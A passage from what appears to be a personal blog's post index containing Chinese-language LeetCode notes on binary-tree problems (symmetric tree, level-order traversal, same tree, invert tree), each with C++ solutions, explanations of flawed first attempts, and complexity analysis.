class="literal">false</span>;</span><br><span class="line">    <span class="built_in">inorder</span>(root);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(<span class="type">int</span>)(result_inorder.<span class="built_in">size</span>()/<span class="number">2</span>)+<span class="number">1</span>;++i)&#123;</span><br><span class="line">        <span class="keyword">if</span>(result_inorder[i]!=result_inorder[result_inorder.<span class="built_in">size</span>() -i <span class="number">-1</span>]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">else</span> result = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的程式只能判斷值是否對稱，但無法判斷結構是否對稱，像是下面這顆樹就會判斷成是對稱的樹</p><p><code>root = [1,2,2,2,null,2]</code></p><p><img src="/img/LeetCode/101/case.png"></p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isMirror</span><span class="params">(TreeNode* leftNode, TreeNode* rightNode)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(leftNode == <span class="literal">NULL</span> &amp;&amp; rightNode == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(leftNode == <span class="literal">NULL</span> || rightNode == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (leftNode-&gt;val == rightNode-&gt;val &amp;&amp; <span class="built_in">isMirror</span>(leftNode-&gt;right, rightNode-&gt;left) &amp;&amp; <span class="built_in">isMirror</span>(leftNode-&gt;left, rightNode-&gt;right)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isSymmetric</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="type">bool</span> result;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        result = <span class="built_in">isMirror</span>(root-&gt;left, root-&gt;right);</span><br><span class="line">        <span class="keyword">return</span> result;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><p>後續的解法還是參考了一下網路上的提示，也就是宣告了一個以左節點和右節點作為參數的函數來進行判斷。</p><ul><li>首先檢查兩個節點是否同時為空（NULL），如果是，則返回 <code>true</code>，表示兩個空 subTree 是鏡像對稱的</li><li>如果只有一個節點為空就代表結構不對稱</li><li>如果左右兩節點都不為空，那就檢查他們的值是否一樣，並且進行遞迴檢查：<ul><li>這裡可以參考題目上的圖，<strong>鏡像對稱的特點會是left child 的 right child 與 right child 的 left child 一樣</strong></li><li><strong>同理，right child 的 left child 會與 left child 的　right child 一樣</strong></li><li>如果上面條件都同時滿足，那就回傳 <code>true</code></li></ul></li></ul><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/101/result.jpeg"></p><h2 id="另一種做法"><a href="#另一種做法" class="headerlink" title="另一種做法"></a>另一種做法</h2><p>有看到另一種蠻直觀的作法，就是用queue去做</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isSymmetric</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// An empty tree is symmetric</span></span><br><span class="line">        queue&lt;TreeNode*&gt; q;</span><br><span class="line">        q.<span class="built_in">push</span>(root-&gt;left);</span><br><span class="line">        q.<span class="built_in">push</span>(root-&gt;right);</span><br><span class="line">        <span class="keyword">while</span> (!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            TreeNode* left = q.<span class="built_in">front</span>(); q.<span class="built_in">pop</span>();</span><br><span class="line">            TreeNode* right = q.<span class="built_in">front</span>(); q.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">if</span>(left == <span class="literal">NULL</span>  &amp;&amp; right == <span class="literal">NULL</span>) <span class="keyword">continue</span>; <span class="comment">// Both are NULL, symmetric at this level</span></span><br><span class="line">            <span class="keyword">if</span>(left ==<span class="literal">NULL</span>  <span class="keyword">or</span>  right==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// One is NULL and the other is not, not symmetric</span></span><br><span class="line">            <span class="keyword">if</span>(left-&gt;val != right-&gt;val) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// Values differ, not symmetric</span></span><br><span class="line">            <span class="comment">// Enqueue children in the order to compare them as mirror images</span></span><br><span class="line">            q.<span class="built_in">push</span>(left-&gt;left);</span><br><span class="line">            q.<span class="built_in">push</span>(right-&gt;right);</span><br><span class="line">            q.<span class="built_in">push</span>(left-&gt;right);</span><br><span class="line">            q.<span class="built_in">push</span>(right-&gt;left);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// tree is symmetric</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>這裡首先將左右 child push 進 queue</li><li>接著當 queue不為空的時候就會開始進行一系列操作:<ul><li>首先透過 <code>left</code> 和 <code>right</code> 指標來指向剛剛放入queue的左右節點</li><li>接著就是比較，如果其中一個為null，那就是tree結構不對稱</li><li>如果都是 null，就代表到目前為止是對稱的，繼續往下執行</li><li>如果都不為null，就去比較左右節點的資料值 <code>val</code>，如果不一樣回傳 <code>false</code></li><li>接著依序將left child 的 left child 放入 queue</li><li>再將 right child 的 right child 放入 queue，可以看題目的範例圖，其中一對需要比較對稱的位置就是這</li><li>將 left child 的 right child 放入 queue</li><li>再將 right child 的 left child 放入 queue，可以看題目的範例圖，其中一對需要比較對稱的位置就是這</li></ul></li></ul><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>$O(n)$， n 為樹的節點數量</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>$O(h)$，h 為樹的高度，在平衡樹下 $h &#x3D; logN$</p><h1 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h1><p>今天狀況不太好，一開始就急著解題，沒有思考 Traversal 僅能判斷值是否對稱，少考慮了結構上的對稱。我很慚愧。</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C++ </tag>
            
            <tag> Tree </tag>
            
            <tag> Binary Tree </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二元樹 Level Order Traversal | Medium | LeetCode#102. Binary Tree Level Order Traversal</title>
      <link href="/posts/db053989.html"/>
      <url>/posts/db053989.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/102/question.jpeg"></p><ul><li>題目難度: <code>Medium</code></li><li>題目敘述: 給定一個 Binary Tree 的 <code>root</code>，求 Level Order Traversal 的結果 (須將節點值存在一個二維list中)</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>就是先實踐經典的 Level Order Traversal，然後再嘗試存進 <code>vector&lt;vector&lt;int&gt;&gt; result</code> 返回。但我的想法在我剛實現完標準的 level_order_traversal 後就卡住了，由於我是用 queue 來去做實現，而每一次 push 進 queue後的節點會為同一層 (因為上一層已經被pop出來了) ，因此就可以處理在每一層的時候將節點值添加進 <code>result</code> 中，但我高估了我對 <code>vector</code> 的熟悉程度…</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; result=&#123;&#125;;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">levelOrder</span>(TreeNode* root) &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">NULL</span>) <span class="keyword">return</span> result;</span><br><span class="line">        queue&lt;TreeNode*&gt;q;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        q.<span class="built_in">push</span>(root);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="type">int</span> levelSize = q.<span class="built_in">size</span>();</span><br><span class="line">            ++count;</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; currentLevel;  </span><br><span class="line"></span><br><span class="line">            <span class="comment">//cout &lt;&lt; &quot;Level &quot; &lt;&lt; ++count &lt;&lt; endl;</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; levelSize; ++i)&#123;</span><br><span class="line">                TreeNode *current = q.<span class="built_in">front</span>();</span><br><span class="line">                q.<span class="built_in">pop</span>();</span><br><span class="line">                currentLevel.<span class="built_in">push_back</span>(current-&gt;val); </span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(current-&gt;left!=<span class="literal">NULL</span>)&#123; </span><br><span class="line">                    q.<span class="built_in">push</span>(current-&gt;left);</span><br><span class="line">                    </span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(current-&gt;right!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">                    q.<span class="built_in">push</span>(current-&gt;right);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            result.<span class="built_in">push_back</span>(currentLevel);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><ul><li>首先，宣告一個 <code>vector&lt;vector&lt;int&gt;&gt; result</code> 來儲存lever order後的結果</li><li>使用一個 <code>while</code> loop，當queue不為空時，執行以下步驟：<ul><li>獲取當前層的節點數  <code>levelSize</code>，跟剛剛一樣，queue中尚未pop出來的元素會是相同level的節點</li><li>創建一個  <code>vector&lt;int&gt; currentLevel</code>     用於存放當前層的節點值，這也會是二維vector操作的標準做法之一能說這塊第一次練習到</li><li>使用一個 <code>for</code> loop，對當前層的每個節點進行如下操作：<ul><li>取出 front node，將其值加入 <code>currentLevel</code></li><li>若該節點的left child不為空，將它push 進入queue</li><li>若該節點的right child不為空，將它push 進入queue</li></ul></li><li>將 <code>currentLevel</code> 加入 result 中。</li></ul></li></ul><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/102/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>整個樹的所有節點都會被訪問一次，時間複雜度是 $O(N)$，N 是二元樹中節點的總數</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>空間複雜度主要受結果vector <code>result</code> 影響，<code>result</code> 的大小取決於二元樹的節點數，因此其空間需求為 $O(N)$，另外有使用到 queue，最壞狀況下可能會儲存整棵樹倒queue中，因此空間複雜度會是  $O(N)$</p><p>整體而言的空間複雜度會是 $O(N)$ + $O(N)$ &#x3D; $O(N)$</p><h1 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h1><p>這題直接讓我了解自己對於 <code>vector</code> 的使用不太熟悉，另外在判斷層的時候也時常想錯，尚有很大的進步空間。</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Tree </tag>
            
            <tag> Binary Tree </tag>
            
            <tag> Medium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>相同的二元樹 | Easy | LeetCode#100. Same Tree</title>
      <link href="/posts/3dab679e.html"/>
      <url>/posts/3dab679e.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/100/question.jpeg"></p><p><img src="/img/LeetCode/100/question2.jpeg"></p><ul><li>題目難度: <code>Easy</code></li><li>題目敘述: 給定兩個 Binary Tree 的 root，分別是 <code>p</code> 與 <code>q</code>，請寫一個函式檢查他們是否相同</li></ul><blockquote><p>相同的定義: 結構一樣，並且節點值一樣</p></blockquote><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>我的想法一樣是遞迴，首先Traverse 到 Leaf，之後檢查節點值，如果不一樣就直接回傳 <code>false</code>，我們可以用一個變數值，將遞迴回傳的結果保存起來，再做為函式的返回值</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">bool</span> result =<span class="literal">true</span>;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isSameTree</span><span class="params">(TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(p == <span class="literal">NULL</span> &amp;&amp; q == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (p == <span class="literal">NULL</span> &amp;&amp; q != <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (p != <span class="literal">NULL</span> &amp;&amp; q == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;P:&quot;</span> &lt;&lt; p-&gt;val &lt;&lt; <span class="string">&quot;q:&quot;</span> &lt;&lt; q-&gt;val &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;val != q-&gt;val ) &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;Not the same Tree&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">return</span>  <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;left != <span class="literal">NULL</span> || q-&gt;left != <span class="literal">NULL</span>) result = <span class="built_in">isSameTree</span>(p-&gt;left, q-&gt;left);</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;right != <span class="literal">NULL</span> || q-&gt;right != <span class="literal">NULL</span>) result = <span class="built_in">isSameTree</span>(p-&gt;right, q-&gt;right);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(p == <span class="literal">NULL</span> &amp;&amp; q == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>表示已經遍歷到兩棵樹的末端，並且到目前為止兩棵樹是相同的，所以返回 <code>true</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (p == <span class="literal">NULL</span> &amp;&amp; q != <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (p != <span class="literal">NULL</span> &amp;&amp; q == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果其中一個節點是 NULL 而另一個不是，這表示兩棵樹在這個位置上結構不同，因此返回 <code>false</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(p-&gt;val != q-&gt;val ) &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Not the same Tree&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span>  <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>p</code> 和 <code>q</code> 的值不同，返回 false</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(p-&gt;left != <span class="literal">NULL</span> || q-&gt;left != <span class="literal">NULL</span>) result = <span class="built_in">isSameTree</span>(p-&gt;left, q-&gt;left);</span><br><span class="line"><span class="keyword">if</span>(p-&gt;right != <span class="literal">NULL</span> || q-&gt;right != <span class="literal">NULL</span>) result = <span class="built_in">isSameTree</span>(p-&gt;right, q-&gt;right);</span><br></pre></td></tr></table></figure><p>檢查左子樹：如果 p 或 q 的左子樹不為 NULL，遞迴檢查左子樹是否相同<br>檢查右子樹：如果 p 或 q 的右子樹不為 NULL，遞迴檢查右子樹是否相同</p><blockquote><p>但其實這裡會有問題，因為如果左子樹返回 false，而右子樹返回 true，它仍會返回最後一次賦值的結果。應該需要加個判斷式來判斷是否出現false result</p></blockquote><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/100/result.jpeg"></p><h2 id="更好的寫法"><a href="#更好的寫法" class="headerlink" title="更好的寫法"></a>更好的寫法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (p == <span class="literal">NULL</span> || q == <span class="literal">NULL</span>) <span class="keyword">return</span> p == q;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;P:&quot;</span> &lt;&lt; p-&gt;val &lt;&lt; <span class="string">&quot; q:&quot;</span> &lt;&lt; q-&gt;val &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (p-&gt;val != q-&gt;val) &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Not the same Tree&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">isSameTree</span>(p-&gt;left, q-&gt;left) &amp;&amp; <span class="built_in">isSameTree</span>(p-&gt;right, q-&gt;right);</span><br><span class="line"></span><br></pre></td></tr></table></figure><div class="note info flat"><p>這裡合併了上面很冗的判斷式，將 <code>p</code> 和 <code>q</code> 同時為 NULL 或其中之一為 NULL 的情況合併成一個條件。並且移掉了冗餘檢查：在呼叫 isSameTree 前，檢查子樹是否為 NULL 是多餘的，因為遞迴呼叫中已經處理了這種情況，使用遞迴直接返回，利用邏輯運算 <code>&amp;&amp;</code> 直接返回子樹比較結果，減少不必要的變數。</p></div><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>$O(N)$, N 為節點個數，每個節點在遞迴中被訪問一次，進行比較操作，因此時間複雜度是線性的。</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>$O(H)$, H　為樹的高度，最壞情況下樹高會等於節點數量 N，而如果式平衡二元樹，則會是 $O(LogN)$</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C++ </tag>
            
            <tag> Tree </tag>
            
            <tag> Binary Tree </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反轉二元樹 | Easy | LeetCode#226. Invert Binary Tree</title>
      <link href="/posts/5371066e.html"/>
      <url>/posts/5371066e.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/226/question1.jpeg"></p><ul><li>題目難度: <code>Easy</code></li><li>題目敘述: 給定一個 Binary Tree 的<code>root</code>，反轉他以後，回傳它的 <code>root</code></li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><blockquote><p>題目敘述很簡短，但基本上就是除了root以外，左葉子樹的成員都對調</p></blockquote><blockquote><p>但學會了<a href="https://leozzmc.github.io/posts/4cd60718.html">上一題</a>遞迴的概念後，這題幾乎是秒解，但還是有考慮不周到的地方</p></blockquote><p>我一開始的想法，就是一樣透過遞迴的方式，一開始就 traverse 到樹葉，碰到樹葉後，再將他們的左右child進行對調，之後一路fuction return 回去，然後回傳一開始原先的root即可</p><p>我一開始的思路會是下面這樣</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">TreeNode *<span class="title">BT::invertTree</span><span class="params">(TreeNode* root)</span></span>&#123;</span><br><span class="line">    TreeNode *tmp = <span class="number">0</span>;</span><br><span class="line">    TreeNode *current = root;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(current-&gt;left != <span class="literal">NULL</span> &amp;&amp; current-&gt;right != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">invertTree</span>(current-&gt;left);</span><br><span class="line">        <span class="built_in">invertTree</span>(current-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    tmp = current-&gt;left;</span><br><span class="line">    current-&gt;left = current-&gt;right;</span><br><span class="line">    current-&gt;right = tmp;</span><br><span class="line">    tmp =<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但上面的 <code>if(current-&gt;left != NULL &amp;&amp; current-&gt;right != NULL)&#123;&#125;</code> 會在 skewd tree 的時候出問題:</p><p>原本給的 tree會是 <code>[2,3,null,1]</code>，如果按照這樣跑出來會是 